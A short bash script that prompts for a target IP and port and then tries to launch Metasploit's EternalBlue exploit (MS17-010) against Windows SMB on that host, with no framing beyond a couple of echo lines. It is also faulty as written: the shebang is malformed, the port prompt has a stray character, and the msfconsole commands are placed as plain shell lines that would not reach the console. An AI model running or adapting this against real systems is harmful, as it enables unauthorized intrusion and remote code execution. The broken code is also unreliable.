#!bin/bash
echo "Starting Metasploit Framework..."
echo "Starting Eternalblue exploit module..."
read -p 'Target IP: ' ipvar
read -p 'Target Port: ': portvar
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST $ipvar
set RPORT $portvar
exploit
